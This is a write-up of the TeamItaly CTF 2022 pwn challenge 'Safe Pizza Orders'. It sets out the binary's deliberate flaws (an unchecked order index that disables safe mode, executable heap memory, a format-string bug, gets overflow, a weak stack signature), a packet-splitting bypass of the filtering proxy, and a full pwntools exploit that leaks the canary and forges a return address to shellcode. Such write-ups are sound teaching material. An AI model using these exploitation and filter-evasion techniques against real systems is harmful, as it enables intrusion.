# TeamItaly CTF 2022

## Safe Pizza Orders (4 solves)

In this challenge we found 2 important files:

- The binary that execute the service
- The source code of the proxy used to protect this binary

The docker container source code of the challenge is given, giving the possibility to execute locally the challenge and try to bypass the proxy.
Otherwise, the challenge can be started locally with the binary ignoring the filtering action of the proxy.

### General details about the binary

- In the binary there are different standard function that were re-wrote to be "more secure", but each of these function has an "unsafe alternative" that can be callable changing a specific value (That is the order 0).
- The binary is protected by a signature of the base pointer and of the return value, that is generated and verified every time we use a function. This system works well, but the signature can be calculated easily due to his implementation
- The binary is exposed using a proxy, that avoid the sending of big quantity of data and avoid the input of 3 consecutive "stange character" (matched with this regex: /[^a-zA-Z0-9\.,\-\_ ]{3,}/)

### Solution

Details and vulnerabilities:

#### Arbitrary last_order index

```cpp
#define MAX_ORDERS 20

int interactive_order_choose(){
    while (true){
        printf("Choose order (from %d to %d) > ", 1, MAX_ORDERS);
        int res = readint();
        if (res < 0) return res; //This allow you to skip the input of the order ID
        last_order = res; //Here is not checked if the order is 0 or upper than 20
        if (res >= 1 && res <= MAX_ORDERS){
            return res;
        }else{
            _println("Invalid order number, try again");
        }
    }
}
```

looking at how is composed this function, you can easily choose an arbitrary value of last_order global variable, putting first the id 0, and after this a negative number.

After this operation last_order will be set to 0, and you will be able to access to the order 0 using the specific function in the menu that use last_index as input and deactivate the security function.

```cpp
#define SAFETY_ON (orders[0] != NULL && orders[0]->content[0] == '1')
```

This is what made security functions on, so just removing order 0, you will be able to deactivate the safety mode

#### RWX memory malloc

Looking at some "safe" function, you could see how is built the malloc function.

```cpp
struct malloc_node * head_malloc_pointer = NULL, * tail_malloc_pointer = NULL;
#define MALLOC_HEADER sizeof(struct malloc_node)
#define MALLOC_NODE_MEM(__ptr) ((void*)(((void *)__ptr)+MALLOC_HEADER))
#define MALLOC_NODE_BY_MEM(__ptr) ((struct malloc_node *)(((void *)__ptr)-MALLOC_HEADER))

void* safe_malloc(size_t size){
    struct malloc_node* res = (struct malloc_node *)mmap( NULL, size+sizeof(struct malloc_node), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0 );
    if(res == MAP_FAILED){
        fputs("Mapping Failed\n", stderr);
        exit(1);
    }
    res->size = size;
    if (head_malloc_pointer == NULL){
        head_malloc_pointer = res;
        tail_malloc_pointer = res;
        res->next = NULL;
    }else{
        tail_malloc_pointer->next = res;
        res->next = NULL;
        tail_malloc_pointer = res;
    }
    return MALLOC_NODE_MEM(res);
}

void* _malloc(size_t size){
    if (SAFETY_ON){
        return safe_malloc(size);
    }else{
        return malloc(size);
    }
}
```

this version of malloc uses directly the mmap primitive to allocate heap memory. This is ok (too slow, but ok), except the fact that the permission given to this memory location exceed the "normal" permissions given to the heap. Setting `PROT_READ | PROT_WRITE | PROT_EXEC` the memory mapped will be executable, and this helps you a lot during exploitation. The design of the new malloc function is not thought to be vulnerable, and there aren't overflow available because \_strncpy is always safe (in both versions).

#### Seccomp

The using of seccomp filter limitate the execution of some syscall by the binary, this should be considered during exploitation.

```cpp
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(newfstatat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(readv), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(writev), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigprocmask), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(gettid), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getpid), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(tgkill), 0);
seccomp_load(ctx);
```

This is the policy applied using the c code above, and this will made available only some syscall which are: fstat, open, write, openat, read, close, mmap, munmap, lseek, newfstatat, exit, exit_group, readv, writev, rt_sigprocmask, gettid, getpid, tgkill

#### "La proxy"

"La proxy" is a real TCP proxy written using the boost library, that use the ios loop to manage efficiently all the requests to forward to real TCP server. Uses pcre2 c library (through a [c++ wrapper](https://github.com/jpcre2/jpcre2)) to filter TCP requests.

The proxy itself doesn't contain any software vulnerability, but looking at the way it works, you can easily bypass his filtering action. In fact, the proxy analyses specifically the TCP packets and not the TCP flux. This means that to bypass the limit of 3 consecutive "non standard" character filter (That is this one: `[^a-zA-Z0-9\.,\-_ ]{3,}`) you can send small sequence of these characters: for instance, if you need to send 0xdeadbeef, you could send first 0xdead and after 0xbeef, the binary will receive the merged string but the proxy won't filter that.

After the competition, there was add another filter to the proxy that don't allow to use %n (so writing) in the print format string, that could be used to bypass the proxy in an unintended way only using the printf

#### Stack Signature

In this binary there is a custom additional security check, that through a xor of the base pointer, the return address in the stack and a secret of 2 bytes, sign these data creating a signature value, that is checked at the end of every function.

This is how the signature is created and stored (in the first 2-bytes of the return address).

```cpp
void __cyg_profile_func_enter (void *this_fn, void *call_site){
    __asm__ (
        "pop %%rbp;                             \n" //Reset stack pointers
        "pop %%rdx;                             \n" //Get return value

        "mov %[secret], %%ax;                   \n" //Assign value of the secret

        "mov $14, %%rcx;                        \n" //Set the number of bytes to write (excluding the first 2 of the ret pointer)
                                                    //Where will be written the signature, and that are 0x00
        "sig_calc__cyg_profile_func_enter:      \n" //INIT of loop
        "test %%rcx, %%rcx;                     \n" //Check if is the end of loop
        "je end_sig__cyg_profile_func_enter;    \n" //If is the end of loop, jump to the end of the loop
        "dec %%rcx;                             \n" //Decrement the number of bytes to write
        "xor (%%rbp), %%al;                     \n" //Calculating signature with the first byte of the secret
        "xor (%%rbp), %%ah;                     \n" //Calculating signature with the second byte of the secret
        "inc %%rbp;                             \n" //Increment pointer to next byte to sign
        "jmp sig_calc__cyg_profile_func_enter;  \n" //Loop
        "end_sig__cyg_profile_func_enter:       \n" //End of the loop
        "mov %%ax, (%%rbp);                     \n" //Assign signature to fist 2-bytes of return address (that is likely to be 0x0000)
        "sub $14, %%rbp;                        \n" //Reset base pointer

        "jmp *%%rdx;                            \n" //return to back function
        :
        : [secret] "r" (secret)
        : "memory"
    );
}
```

This is the verify procedure of the signature.

```cpp
void __cyg_profile_func_exit  (void *this_fn, void *call_site){
    __asm__ (
        "pop %%rbp;                             \n" //Reset stack pointers
        "pop %%rdx;                             \n" //Get return value

        "mov %[secret], %%ax;                   \n" //Assign value of the secret

        "mov $14, %%rcx;                        \n" //Set the number of bytes to write (excluding the first 2 of the ret pointer)
                                                    //Where will be written the signature, and that are 0x00
        "sig_calc__cyg_profile_func_exit:       \n" //INIT of loop
        "test %%rcx, %%rcx;                     \n" //Check if is the end of loop
        "je end_sig__cyg_profile_func_exit;     \n" //If is the end of loop, jump to the end of the loop
        "dec %%rcx;                             \n" //Decrement the number of bytes to write
        "xor (%%rbp), %%al;                     \n" //Calculating signature with the first byte of the secret
        "xor (%%rbp), %%ah;                     \n" //Calculating signature with the second byte of the secret
        "inc %%rbp;                             \n" //Increment pointer to next byte to sign
        "jmp sig_calc__cyg_profile_func_exit;   \n" //Loop
        "end_sig__cyg_profile_func_exit:        \n" //End of the loop
        "xor %%ax, (%%rbp);                     \n" //xor the value with the old_signature, this will reset the return pointer
        "mov (%%rbp), %%ax;                     \n" //Copy the signature space for the check to 0x0000 (avoid segfault)
        "sub $14, %%rbp;                        \n" //Reset base pointer

        "test %%ax, %%ax;                       \n" //Check if signature is correct
        "je end__cyg_profile_func_exit;         \n" //If not, jump to the return address
        "call __stack_signature_failed;         \n" //Call exit
        "end__cyg_profile_func_exit:            \n" //End of function

        "jmp *%%rdx;                            \n" //return
        :
        : [secret] "r" (secret)
        : "memory"
    );
}
```

This security system is not meant to be breakable, so to bypass it you need to calculate the secret and set the correct signature:
the only fault is the way the signature is calculated, allowing the leak of the secret in an easier way than a bruteforce. The use of bruteforce to bypass this security check is not meant as a solution (The PoW should avoid this possibility at all).

#### Buffer overflow and print format string vuln in unsafe functions

print format string vuln

```cpp
void _println(char* str){
    if (SAFETY_ON){
        puts(str);
    }else{
        size_t len = _strlen(str);
        char buf[len+2];
        _memcpy(buf, str, len);
        buf[len] = '\n';
        buf[len+1] = 0;
        printf(buf);
    }
}
```

Using gets in readline (that is vulnerable by design)

```cpp
void _readline(char* buf, size_t size){
    char * res;
    if (SAFETY_ON){
        res = fgets(buf, size-1, stdin);
        buf[_strlen(buf)-1] = 0;
    }else{
        res = gets(buf);
    }
    if (res == NULL){
        fputs("Reading Failed\n", stderr);
        exit(1);
    }
}
```

### Exploit

```python
import re, time, hashlib, string
from pwn import *

context.arch = 'amd64'

HOST = os.environ.get("HOST", "pizza-orders.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15008))

p = remote(HOST, PORT)

def num_to_charseq(num, charset=string.ascii_letters):
    res = ""
    while True:
        if num < len(charset):
            res += charset[num]
            break
        res += charset[num%len(charset)]
        num //= len(charset)
    return res

def solve_pow(init_str, end_hash):
    num = 0
    while True:
        try_solve = init_str + num_to_charseq(num)
        if hashlib.sha256(try_solve.encode('ascii')).hexdigest().lower().endswith(end_hash.lower()):
            return try_solve
        num += 1

#Solve PoW (this can be activated or deactivated)
if p.recvuntil(b"Give me a string", timeout=0.5):
    proc = log.progress('PoW Required, solving...')
    p.recvuntil(b"starting in ")
    init_string = p.recvuntil(b" ")[:-1]
    p.recvuntil(b"ends in ")
    hash_end = p.recvuntil(b".")[:-1]
    p.sendline(solve_pow(init_string.decode(), hash_end.decode()).encode())
    proc.success('PoW Solved, Starting Exploit')
else:
    log.info("PoW not required, starting exploit")

log.info("Monkey Patching send_raw to bypass 'laproxy'")
p.original_send_raw = p.send_raw
def monkey_patched_send_raw(data):
    data = to_bytes(data)
    for i in range(0,len(data),2):
        p.original_send_raw(data[i:i+2 if i+2<=len(data) else len(data)])
        time.sleep(.05)#Avoid TCP packets aggregation
p.send_raw = monkey_patched_send_raw

#Transform whatever you pass into bytes
def to_bytes(v):
    if isinstance(v, bytes): return v
    return str(v).encode()

#Send a command in the menu
def sendcmd(num):
    p.sendlineafter(b"> ", to_bytes(num))

#Send multiple commands in the menu
def sendcmds(*nums):
    [sendcmd(num) for num in nums]

#Send order details
def sendorderdetails(title, content):
    p.sendlineafter(b"> ", to_bytes(title))
    p.sendlineafter(b"> ", to_bytes(content))

#Add an order
def addorder(title, content):
    sendcmd(1)
    sendorderdetails(title, content)

#Get the result of a printf vuln (useful for dumping the stack)
def printfvuln(text):
    sendcmds(2,20)
    sendorderdetails("FOO", text)
    sendcmds(4,20)
    delimiter = b"***********************************\n"
    p.recvuntil(delimiter)
    p.recvuntil(delimiter)
    return p.recvuntil(delimiter)[:-len(delimiter)].decode()

#Get bytes from a address in int format
def get_bytes(addr,n=8):
    mask = 0xff
    for b_num in range(n):
        yield (addr&mask) >> (b_num*8)
        mask <<= 8

#Calculate the secret thanks to the information in the stack
def calc_secret():
    search_result = printfvuln("%p."*40).split(".")[37:39]
    bp, ret = search_result
    bp, ret = int(bp,16), int(ret,16)
    sign = ret >> (8*6) #Take signature bytes
    clean_ret = ret & ( ~(0xffff<<(8*6)) )
    sign_bytes = list(get_bytes(clean_ret)) + list(get_bytes(bp))
    for ele in sign_bytes:
        sign ^= ele
        sign ^= ele<<8
    return sign #Now this is calculated the secret

#Get the canary thanks to the information in the stack
def get_canary():
    return int(printfvuln("%p."*40).split(".")[26], 16)

#Taken the base pointer and the return pointer, calculate the stack signed return pointer
def sign_calc(ret, sec, bp = 0xdeadbeefdeadbeef):
    for byte in list(get_bytes(ret)) + list(get_bytes(bp)):
        sec ^= byte
        sec ^= byte<<8
    ret |= sec << (8*6)
    return pack(bp,64)+pack(ret,64)

log.info("Checking service availability")
if not p.recvuntil(b"Choose an option:", timeout=3):
    exit("Server not responding")

proc = log.progress("Crafting shellcode to get the flag")
shellcode_payload = asm(
    shellcraft.cat2("./pizza_secret_recipe") + #cat2 uses legal system calls, cat use sendfile syscall that is illegal
    shellcraft.exit(0) #Exit carefully the program (optional)
)
proc.success("Done")

proc = log.progress("Sending order value with the shellcode")
addorder("GIMME THE FLAG!", shellcode_payload)
proc.success("Done")

sendcmds(2,0,-1,7)
log.info("Deleted order 0 containing the SAFE MODE value, activated unsafe functions")

sendcmds(4,1)
p.recvuntil(b"Advanced details: ")
shellcode_addr = int(p.recvline(),16)+20
log.info("Get shellcode address: {}".format(hex(shellcode_addr)))

secret = calc_secret()
log.info("Calculated secret: {}".format(hex(secret)))

canary = get_canary()
log.info("Leaked canary: {}".format(hex(canary)))

new_signature = sign_calc(shellcode_addr, secret)
log.info("New return address and base pointer with signature: {}".format(new_signature.hex()))

# Sending the malicious payload
# --> Here there are multiple canaries, so I spammed them here and used as padding
proc = log.progress("Sending malicious payload")
p.sendline(b"A"*10+p64(canary)*3+new_signature)
proc.success("Done")
# "A"*10 = buffer of _readline
# p64(canary)*3 = 3 canaries + padding
# sign_calc(shellcode_addr, secret) = return address signed

p.recvuntil(b"> ") #Wait for the menu

secret_menu = p.recvall().decode()

log.info("FLAG: "+"".join(re.findall(r"flag{.*}",secret_menu))) # Here will be printed and filtered the flag

```
